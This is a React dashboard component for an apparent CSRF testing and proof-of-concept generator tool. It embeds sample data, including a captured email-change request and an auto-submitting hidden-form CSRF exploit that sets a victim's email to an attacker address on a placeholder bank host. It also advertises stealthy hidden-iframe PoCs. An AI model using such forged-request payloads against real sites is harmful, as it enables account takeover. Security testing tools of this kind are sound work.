import { useState } from 'react';
import { Link } from 'react-router-dom';
import {
  Shield,
  FileCode,
  Zap,
  PlayCircle,
  AlertTriangle,
  ArrowRight,
  Lock,
  Code2,
  Terminal,
  Activity,
  CheckCircle2,
} from 'lucide-react';
import { StatCard } from '../components/ui/StatCard';
import { Card, CardHeader, CardTitle, CardDescription } from '../components/ui/Card';
import { Badge } from '../components/ui/Badge';
import { Button } from '../components/ui/Button';
import { CodeBlock } from '../components/ui/CodeBlock';
import { Alert } from '../components/ui/Alert';

const samplePayload = `POST /api/v1/user/email/update HTTP/1.1
Host: vulnerable-bank.internal
User-Agent: Mozilla/5.0 (Security-Audit)
Cookie: session_id=9f823a8b417c; auth_token=eyJhbGciOi...
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

email=attacker%40evil-domain.corp`;

const sampleGeneratedPoc = `<!DOCTYPE html>
<html>
  <!-- CSRF Forge Automated Exploit PoC -->
  <body>
    <h3>Transfer Confirmation</h3>
    <form id="csrfForm" action="https://vulnerable-bank.internal/api/v1/user/email/update" method="POST">
      <input type="hidden" name="email" value="attacker@evil-domain.corp" />
    </form>
    <script>
      // Auto-submit on payload load
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>`;

export function Dashboard() {
  const [selectedDemoTab, setSelectedDemoTab] = useState<'request' | 'poc'>('request');
  const [dismissAlert, setDismissAlert] = useState(false);

  return (
    <div className="space-y-6 max-w-7xl mx-auto">
      {/* Top Banner / Disclaimer */}
      {!dismissAlert && (
        <Alert
          type="info"
          title="Sandbox Security Mode Active"
          onDismiss={() => setDismissAlert(true)}
        >
          All request parsing, cryptographic token evaluation, and exploit generation occur entirely inside your browser memory. No telemetry or payload data is transmitted to external servers.
        </Alert>
      )}

      {/* Header Profile */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <div className="flex items-center gap-2.5">
            <h2 className="text-2xl font-extrabold tracking-tight text-dark-100">
              Security Operations Dashboard
            </h2>
            <Badge severity="secure" variant="glow" size="sm">
              READY
            </Badge>
          </div>
          <p className="text-dark-400 text-xs mt-1 font-mono">
            TARGET RECONNAISSANCE • CSRF EVALUATION • AUTO-POC GENERATION
          </p>
        </div>

        <div className="flex items-center gap-3">
          <Link to="/parser">
            <Button
              variant="primary"
              size="sm"
              leftIcon={<Terminal className="w-4 h-4" />}
            >
              Parse Request
            </Button>
          </Link>
          <Link to="/generator">
            <Button
              variant="secondary"
              size="sm"
              leftIcon={<Zap className="w-4 h-4" />}
            >
              New PoC
            </Button>
          </Link>
        </div>
      </div>

      {/* Stat Grid */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        <StatCard
          label="Requests Parsed"
          value="14"
          icon={FileCode}
          color="text-blue-400"
          subtext="HTTP & cURL captures"
          trend={{ value: "+3 today", positive: true }}
        />
        <StatCard
          label="Vulnerabilities Flagged"
          value="9"
          icon={AlertTriangle}
          color="text-amber-400"
          subtext="Missing tokens / lax cookies"
          trend={{ value: "High Risk Rate", positive: false }}
        />
        <StatCard
          label="PoCs Generated"
          value="26"
          icon={Zap}
          color="text-cyber-400"
          subtext="HTML, Ajax & Beacons"
          glow
          trend={{ value: "100% Client-Side", positive: true }}
        />
        <StatCard
          label="System Resilience"
          value="GRADE B"
          icon={Shield}
          color="text-emerald-400"
          subtext="Common mitigations verified"
        />
      </div>

      {/* Quick Launch & Workflows */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2 space-y-6">
          {/* Quick Action Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
            <Link to="/parser" className="group">
              <Card className="h-full group-hover:border-cyber-500/40 group-hover:bg-dark-900 transition-all">
                <div className="p-2 w-fit rounded-lg bg-blue-950/60 border border-blue-500/30 text-blue-400 mb-3 group-hover:scale-110 transition-transform">
                  <Code2 className="w-5 h-5" />
                </div>
                <h4 className="text-sm font-semibold text-dark-100 group-hover:text-cyber-300 flex items-center justify-between">
                  Parse Request
                  <ArrowRight className="w-3.5 h-3.5 opacity-0 group-hover:opacity-100 -translate-x-1 group-hover:translate-x-0 transition-all text-cyber-400" />
                </h4>
                <p className="text-xs text-dark-400 mt-1">
                  Paste raw HTTP headers & body or curl commands directly from DevTools.
                </p>
              </Card>
            </Link>

            <Link to="/analyzer" className="group">
              <Card className="h-full group-hover:border-cyber-500/40 group-hover:bg-dark-900 transition-all">
                <div className="p-2 w-fit rounded-lg bg-amber-950/60 border border-amber-500/30 text-amber-400 mb-3 group-hover:scale-110 transition-transform">
                  <Shield className="w-5 h-5" />
                </div>
                <h4 className="text-sm font-semibold text-dark-100 group-hover:text-cyber-300 flex items-center justify-between">
                  Analyze Flaws
                  <ArrowRight className="w-3.5 h-3.5 opacity-0 group-hover:opacity-100 -translate-x-1 group-hover:translate-x-0 transition-all text-cyber-400" />
                </h4>
                <p className="text-xs text-dark-400 mt-1">
                  Inspect SameSite cookies, CSRF tokens, headers, and CORS posture.
                </p>
              </Card>
            </Link>

            <Link to="/playground" className="group">
              <Card className="h-full group-hover:border-cyber-500/40 group-hover:bg-dark-900 transition-all">
                <div className="p-2 w-fit rounded-lg bg-emerald-950/60 border border-cyber-500/30 text-cyber-400 mb-3 group-hover:scale-110 transition-transform">
                  <PlayCircle className="w-5 h-5" />
                </div>
                <h4 className="text-sm font-semibold text-dark-100 group-hover:text-cyber-300 flex items-center justify-between">
                  PoC Playground
                  <ArrowRight className="w-3.5 h-3.5 opacity-0 group-hover:opacity-100 -translate-x-1 group-hover:translate-x-0 transition-all text-cyber-400" />
                </h4>
                <p className="text-xs text-dark-400 mt-1">
                  Preview in a sandboxed iframe without risking cross-origin leakage.
                </p>
              </Card>
            </Link>
          </div>

          {/* Interactive Inspection Preview */}
          <Card>
            <CardHeader>
              <div>
                <CardTitle>
                  <Activity className="w-4 h-4 text-cyber-400" />
                  Live Payload & Exploit Inspector
                </CardTitle>
                <CardDescription>
                  Demonstration of automatic HTTP parsing and exploit generation
                </CardDescription>
              </div>

              <div className="flex gap-2">
                <Button
                  variant={selectedDemoTab === 'request' ? 'primary' : 'secondary'}
                  size="sm"
                  onClick={() => setSelectedDemoTab('request')}
                  className="text-xs font-mono"
                >
                  HTTP Request
                </Button>
                <Button
                  variant={selectedDemoTab === 'poc' ? 'primary' : 'secondary'}
                  size="sm"
                  onClick={() => setSelectedDemoTab('poc')}
                  className="text-xs font-mono"
                >
                  Forged PoC
                </Button>
              </div>
            </CardHeader>

            <CodeBlock
              code={selectedDemoTab === 'request' ? samplePayload : sampleGeneratedPoc}
              language={selectedDemoTab === 'request' ? 'http' : 'html'}
              title={selectedDemoTab === 'request' ? 'RAW CAPTURE' : 'GENERATED EXPLOIT'}
              showLineNumbers
              maxHeight="280px"
            />
          </Card>
        </div>

        {/* Sidebar Status / Vulnerability Matrix */}
        <div className="space-y-6">
          <Card>
            <CardHeader>
              <CardTitle>
                <Lock className="w-4 h-4 text-cyber-400" />
                Vulnerability Vectors
              </CardTitle>
            </CardHeader>

            <div className="space-y-3">
              <div className="flex items-center justify-between p-2.5 rounded bg-dark-950/70 border border-dark-800 text-xs">
                <div className="flex items-center gap-2">
                  <div className="w-1.5 h-1.5 rounded-full bg-red-400"></div>
                  <span className="text-dark-200">Missing Anti-CSRF Token</span>
                </div>
                <Badge severity="critical" size="sm">CRITICAL</Badge>
              </div>

              <div className="flex items-center justify-between p-2.5 rounded bg-dark-950/70 border border-dark-800 text-xs">
                <div className="flex items-center gap-2">
                  <div className="w-1.5 h-1.5 rounded-full bg-orange-400"></div>
                  <span className="text-dark-200">SameSite Cookie None/Lax</span>
                </div>
                <Badge severity="high" size="sm">HIGH</Badge>
              </div>

              <div className="flex items-center justify-between p-2.5 rounded bg-dark-950/70 border border-dark-800 text-xs">
                <div className="flex items-center gap-2">
                  <div className="w-1.5 h-1.5 rounded-full bg-amber-400"></div>
                  <span className="text-dark-200">Wildcard CORS Credentialed</span>
                </div>
                <Badge severity="medium" size="sm">MEDIUM</Badge>
              </div>

              <div className="flex items-center justify-between p-2.5 rounded bg-dark-950/70 border border-dark-800 text-xs">
                <div className="flex items-center gap-2">
                  <div className="w-1.5 h-1.5 rounded-full bg-blue-400"></div>
                  <span className="text-dark-200">Predictable Nonce / Timestamp</span>
                </div>
                <Badge severity="low" size="sm">LOW</Badge>
              </div>

              <div className="flex items-center justify-between p-2.5 rounded bg-dark-950/70 border border-dark-800 text-xs">
                <div className="flex items-center gap-2">
                  <div className="w-1.5 h-1.5 rounded-full bg-cyber-400"></div>
                  <span className="text-dark-200">Custom Origin Check Present</span>
                </div>
                <Badge severity="secure" size="sm">SECURE</Badge>
              </div>
            </div>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>
                <CheckCircle2 className="w-4 h-4 text-cyber-400" />
                Tool Capabilities
              </CardTitle>
            </CardHeader>
            <ul className="space-y-2 text-xs text-dark-300">
              <li className="flex items-center gap-2">
                <span className="text-cyber-400 font-bold">✓</span>
                Parse Raw HTTP & cURL with URL-encoded params
              </li>
              <li className="flex items-center gap-2">
                <span className="text-cyber-400 font-bold">✓</span>
                JSON to Form URL-Encoded transformation
              </li>
              <li className="flex items-center gap-2">
                <span className="text-cyber-400 font-bold">✓</span>
                Automatic submission & hidden iframe stealth PoCs
              </li>
              <li className="flex items-center gap-2">
                <span className="text-cyber-400 font-bold">✓</span>
                JSON & Markdown vulnerability reporting
              </li>
            </ul>
          </Card>
        </div>
      </div>
    </div>
  );
}
